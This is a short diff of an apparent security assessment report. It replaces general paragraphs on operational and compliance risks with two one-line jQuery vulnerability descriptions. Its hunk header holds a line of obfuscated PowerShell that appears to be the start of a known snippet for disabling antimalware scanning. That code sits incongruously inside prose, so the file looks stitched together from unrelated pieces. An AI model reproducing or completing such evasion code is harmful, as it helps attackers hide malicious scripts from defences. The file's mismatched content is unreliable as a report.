@@ -36,8 +36,7 @@ S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
 
 =============================================================
 
+jQuery versions >=1.2 and <3.5.0 may execute untrusted code if HTML from untrusted sources is passed to DOM manipulation methods (e.g., .html(), .append()).
 
-Operational Risks: The application faces risks like privilege escalation, malicious file uploads compromising data integrity, host header injection, and HTTP request smuggling allowing unauthorized access. Improper session management can lead to session hijacking, disrupting user activities, while content spoofing damages user trust. Application version disclosure exposes vulnerabilities, enabling targeted attacks. Insecure methods and improper input validation pose threats of unauthorized actions and severe impacts on data integrity and availability.
-
-Compliance Risks: Compliance risks include CSRF vulnerabilities, misconfigured CSP violating security standards, and use of vulnerable components breaching regulations on software security. Improper input validation risks non-compliance with data protection standards like PCI DSS, exposing sensitive data to unauthorized access. Addressing these risks is essential to maintain regulatory compliance, protect user data, and avoid legal and financial consequences.
+jQuery before 3.4.0 mishandles jQuery.extend(true, {}, ...), allowing Object.prototype pollution if an unsanitized source object contains an enumerable proto property.
 
